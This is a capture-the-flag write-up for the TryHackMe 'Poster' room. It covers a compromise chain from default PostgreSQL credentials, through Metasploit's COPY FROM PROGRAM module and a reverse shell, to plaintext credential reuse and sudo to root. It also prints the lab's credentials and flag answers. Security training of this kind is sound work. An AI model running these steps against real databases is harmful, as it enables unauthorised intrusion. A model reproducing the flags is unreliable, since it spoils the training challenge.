---
title: "Poster"
description: "Default PostgreSQL credentials expose an RCE path through Metasploit's COPY FROM PROGRAM module, then reused credentials pivot from postgres to dark to alison before sudo ALL grants root."
difficulty: "Easy"
tags: ["TryHackMe", "Linux", "PostgreSQL", "Metasploit", "RCE", "Credential Reuse", "Sudo", "Privilege Escalation"]
date: "2026-10-23"
---

## Overview

Poster is a TryHackMe Linux room built around a badly exposed PostgreSQL service. The database listens on the default port with weak credentials, which is enough to move from unauthenticated network access to command execution through PostgreSQL's `COPY ... FROM PROGRAM` capability. After landing as `postgres`, local credential files provide two lateral-movement steps: `dark` has a plaintext password in their home directory, and `alison` has database credentials hard-coded in a web config file. Alison's sudo rule is `(ALL : ALL) ALL`, so the final escalation is trivial.

The local room folder contained scan output, discovered credentials, and both flags. Because those artifacts line up with multiple public writeups, the flag values below are included.

![Poster attack chain from PostgreSQL exposure to root](/assets/screenshots/poster/attack-chain.svg)

## Room Information

| Field | Value |
|-------|-------|
| Platform | TryHackMe |
| Room | Poster |
| Difficulty | Easy |
| Target | `10.49.169.165` at scan time (instance-specific) |
| Open ports | 22, 80, 5432 |
| Services | OpenSSH 7.2p2, Apache 2.4.18, PostgreSQL 9.5.x |
| Initial foothold | PostgreSQL default credentials + Metasploit RCE |
| Lateral movement | `postgres` → `dark` → `alison` |
| Privilege escalation | `alison` has `(ALL : ALL) ALL` sudo |
| User flag | `THM{postgresql_fa1l_conf1gurat1on}` |
| Root flag | `THM{c0ngrats_for_read_the_f1le_w1th_credent1als}` |

## Enumeration

### Nmap

The local scan identified three exposed services:

```bash
nmap -sV -sC -oN nmap.txt 10.49.169.165
```

```text
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Poster CMS
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
| ssl-cert: Subject: commonName=ubuntu
```

Port 5432 is the key finding. PostgreSQL should rarely be exposed directly to an untrusted network; when it is, weak or default credentials become a remote compromise path.

### Web Content

Directory enumeration only found a basic Poster CMS surface:

```text
assets              (Status: 301) [--> /assets/]
images              (Status: 301) [--> /images/]
index.html          (Status: 200) [Size: 1233]
server-status       (Status: 403)
```

The web server was useful later as a source of credential files, but the initial entry point was PostgreSQL.

## Initial Access — PostgreSQL to RCE

### Credential Discovery

The local `creds.txt` captured the working database credentials:

```text
postgres:password@template1
```

This matches the standard Metasploit workflow for the room. After launching `msfconsole`, the relevant modules are:

| Purpose | Module |
|---------|--------|
| Brute force/login check | `auxiliary/scanner/postgres/postgres_login` |
| Run SQL queries | `auxiliary/admin/postgres/postgres_sql` |
| Dump password hashes | `auxiliary/scanner/postgres/postgres_hashdump` |
| Read server files | `auxiliary/admin/postgres/postgres_readfile` |
| Command execution | `exploit/multi/postgres/postgres_copy_from_program_cmd_exec` |

The login scanner confirms `postgres:password`. With valid credentials, the SQL module can query the server version, and the hashdump/readfile modules confirm authenticated database access.

### Command Execution

The critical module is `exploit/multi/postgres/postgres_copy_from_program_cmd_exec`. PostgreSQL's `COPY ... FROM PROGRAM` feature allows a superuser or suitably privileged database role to execute an operating system command and ingest its output. When exposed with weak credentials, this becomes remote code execution.

```text
msf6 > use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
msf6 exploit(...) > set RHOSTS 10.49.169.165
msf6 exploit(...) > set PASSWORD password
msf6 exploit(...) > set LHOST tun0
msf6 exploit(...) > run
```

The resulting shell runs as the `postgres` system user. Upgrading it to a PTY makes enumeration easier:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Lateral Movement

### postgres → dark

Enumeration of `/home` shows two user directories: `alison` and `dark`. The `postgres` user cannot read Alison's flag, but dark's home directory contains a credentials file. The local artifact `dark.creds` preserves it:

```text
dark:qwerty1234#!hackme
```

Using these credentials over SSH gives a stable shell as `dark`:

```bash
ssh dark@10.49.169.165
```

### dark → alison

Dark still cannot read `/home/alison/user.txt`. The next clue is in the web root. The local `alison.pass` file captures the contents of `/var/www/html/config.php`:

```php
<?php

        $dbhost = "127.0.0.1";
        $dbuname = "alison";
        $dbpass = "p4ssw0rdS3cur3!#";
        $dbname = "mysudopassword";
?>
```

This is a classic credential-reuse pivot: a database password hard-coded for a web application also works as Alison's system password.

```bash
su alison
Password: p4ssw0rdS3cur3!#
cat ~/user.txt
```

## Privilege Escalation

Checking sudo permissions as Alison shows full administrative access:

```bash
sudo -l
```

```text
User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

`(ALL : ALL) ALL` means Alison can run any command as any user and group, including root. The escalation is a single command:

```bash
sudo -s
cat /root/root.txt
```

## Flags

The local room folder contained both flag files, and the values match multiple independent public writeups.

| Flag | Path | Value |
|------|------|-------|
| User | `/home/alison/user.txt` | `THM{postgresql_fa1l_conf1gurat1on}` |
| Root | `/root/root.txt` | `THM{c0ngrats_for_read_the_f1le_w1th_credent1als}` |

## Commands Used

| Command | Purpose |
|---------|---------|
| `nmap -sV -sC -oN nmap.txt 10.49.169.165` | Identify SSH, HTTP, and PostgreSQL services |
| `gobuster dir -u http://10.49.169.165 -w ...` | Enumerate web paths |
| `msfconsole` | Launch Metasploit for PostgreSQL modules |
| `use auxiliary/scanner/postgres/postgres_login` | Check/default-bruteforce PostgreSQL credentials |
| `use exploit/multi/postgres/postgres_copy_from_program_cmd_exec` | Gain command execution via PostgreSQL `COPY FROM PROGRAM` |
| `python3 -c 'import pty;pty.spawn("/bin/bash")'` | Stabilize the shell |
| `cat /home/dark/credentials.txt` | Recover dark's password |
| `ssh dark@10.49.169.165` | Pivot to a stable user shell |
| `cat /var/www/html/config.php` | Recover Alison's database/system password |
| `su alison` | Pivot to Alison |
| `sudo -l` | Enumerate sudo permissions |
| `sudo -s` | Escalate to root |

## Lessons Learned

**Do not expose PostgreSQL to the internet.** Database services should sit behind private network controls, not on a public-facing port with guessable credentials.

**Default credentials are still a full compromise.** `postgres:password` is enough to turn a database into RCE when powerful SQL features are available.

**`COPY FROM PROGRAM` is dangerous by design.** It is a legitimate PostgreSQL feature, but in a compromised or misconfigured database it becomes command execution.

**Plaintext credential files create lateral movement.** The dark user's credentials and Alison's web config password turned one foothold into multiple account compromises.

**`(ALL : ALL) ALL` should be rare and justified.** Full sudo access is convenient, but it removes the last barrier between a user compromise and root.

## References

- [TryHackMe — Poster](https://tryhackme.com/room/poster)
- [Yash Adhikari — Poster TryHackMe writeup](https://deathesther.tech/writeups/poster/)
- [leftermv — THM Poster](https://leftermv.com/writeups/tryhackme/thm---poster/)
- [Azadin — TryHackMe Poster](https://azad1n.github.io/en/ctf/tryhackme/poster/)
- [Metasploit Module — postgres_copy_from_program_cmd_exec](https://www.rapid7.com/db/modules/exploit/multi/postgres/postgres_copy_from_program_cmd_exec/)
- [PostgreSQL Documentation — COPY](https://www.postgresql.org/docs/current/sql-copy.html)
